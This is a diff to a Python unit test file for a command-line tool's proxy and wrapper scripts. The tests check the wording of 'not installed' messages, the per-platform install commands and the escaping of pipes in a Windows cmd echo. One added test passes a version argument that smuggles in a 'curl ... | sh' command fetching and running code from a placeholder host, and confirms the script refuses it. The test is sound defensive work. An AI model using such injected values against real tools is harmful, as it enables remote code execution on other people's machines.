@@ -9,6 +9,7 @@ from __future__ import annotations
 
 import json
 import os
+import re
 import subprocess
 import unittest
 from pathlib import Path
@@ -19,6 +20,7 @@ from tests.python.support.paths import add_repo_path
 
 add_repo_path("packages/cadgen/src")
 
+from cadgen import updates  # noqa: E402
 from cadgen._internal import installations, proxy  # noqa: E402
 from cadgen.engine.registry import Folder, Registry  # noqa: E402
 from cadgen._internal import engine_host  # noqa: E402
@@ -168,6 +170,16 @@ class ProxyFileTests(Fixture):
         installations.write_proxy(str(self.root / "bin"), windows=True)
         self.assertTrue((self.root / "bin" / "cadgen.cmd").is_file())
 
+    def test_each_script_says_what_the_proxy_says_with_its_own_install_command(self) -> None:
+        # No Windows here to run the cmd: its one echo, read as cmd reads it (^| prints |, where a bare |
+        # would pipe the echo into a command named iex), is the proxy's refusal on Windows. The sh runs on
+        # POSIX below; here, it names the macOS and Linux command where the proxy does.
+        (said,) = re.findall(r"^echo (.*) 1>&2\r$", installations.script(True), re.M)
+        self.assertNotRegex(said, r"(?<!\^)\|")
+        self.assertEqual(said.replace("^|", "|"), proxy.refusal(None, "nt"))
+        self.assertIn(updates.INSTALL_WINDOWS, proxy.refusal(None, "nt"))
+        self.assertIn(f"run \\`{updates.INSTALL}\\`, ", installations.script(False))
+
     def test_the_cmd_takes_the_python_from_its_record_line(self) -> None:
         # No Windows here to run it: for /f's split is simulated. With delims=" a run of quotes is
         # one delimiter and none starts the line, so the line's leading space is token 1.
@@ -193,15 +205,20 @@ class ProxyFileTests(Fixture):
         environment = {"PATH": os.environ.get("PATH", ""), "HOME": str(self.root), "CADGEN_STATE_DIR": str(self.root / "state")}
         missing = subprocess.run([proxy_file, "+9.9.9", "status"], capture_output=True, text=True, env=environment)
         self.assertEqual(missing.returncode, 1)
-        self.assertEqual(missing.stderr.strip(), proxy.NOT_INSTALLED.format(version="9.9.9"))
-        # None installed: the sh and the proxy say it in one wording, the command that installs it.
+        self.assertEqual(missing.stderr.strip(), proxy.refusal("9.9.9"))
+        # None installed: the sh and the proxy say it in one wording, the commands that install it.
         none = subprocess.run([proxy_file, "status"], capture_output=True, text=True, env=environment)
-        self.assertEqual((none.returncode, none.stderr.strip()), (1, proxy.NONE_INSTALLED))
+        self.assertEqual((none.returncode, none.stderr.strip()), (1, proxy.refusal(None)))
         with self.assertRaises(proxy.Refused) as refused:
             proxy.choose(None, [])
-        self.assertEqual(str(refused.exception), "cadgen is not installed: run `uvx --no-config --managed-python "
-                                                 "--python 3.13 --from cadgen cadgen doctor` once, outside any "
-                                                 "sandbox or with its permission")
+        self.assertEqual(str(refused.exception), f"cadgen is not installed: run `{updates.command()}`, or, to "
+                                                 "register the latest release without changing any agent app, "
+                                                 "`uvx --no-config --managed-python --python 3.13 --from cadgen "
+                                                 "cadgen doctor`, once, outside any sandbox or with its permission")
+        # As the proxy, the sh names a version only when it is one: anything else goes into no command.
+        planted = subprocess.run([proxy_file, "+0.8.0;curl -fsSL https://example.invalid|sh", "status"],
+                                 capture_output=True, text=True, env=environment)
+        self.assertEqual((planted.returncode, planted.stderr.strip()), (1, proxy.refusal(None)))
         for version in ("1.0.0", "2.0.0"):
             record = self.registered(version)
             Path(record["python"]).write_text(f'#!/bin/sh\necho "{version}" "$@"\n', encoding="utf-8")
@@ -273,11 +290,15 @@ class ResolutionTests(Fixture):
             self.assertEqual(proxy.main(["+0.8.0", "status"]), 1, "refused in its line, never a traceback")
 
     def test_a_version_not_registered_or_gone_fails_in_one_line(self) -> None:
+        # The install command first, which sets up every agent app; then the one release alone.
         with self.assertRaises(proxy.Refused) as refused:
             self.choose(["+1.0.0", "status"])
         self.assertEqual(str(refused.exception),
-                         "cadgen 1.0.0 is not installed: run `uvx --no-config --managed-python --python 3.13 --from "
-                         "cadgen==1.0.0 cadgen doctor` once, outside any sandbox or with its permission")
+                         f"cadgen 1.0.0 is not installed: run `{updates.command()}`, or, to register exactly this "
+                         "release without changing any agent app, `uvx --no-config --managed-python --python 3.13 "
+                         "--from cadgen==1.0.0 cadgen doctor`, once, outside any sandbox or with its permission")
+        self.assertEqual([proxy.refusal("1.0.0", system).split("`")[1] for system in ("posix", "nt")],
+                         [updates.INSTALL, updates.INSTALL_WINDOWS])
         os.unlink(self.old["python"])
         with self.assertRaisesRegex(proxy.Refused, r"^cadgen 0\.8\.0 is not installed"):
             self.choose(["+0.8.0"])
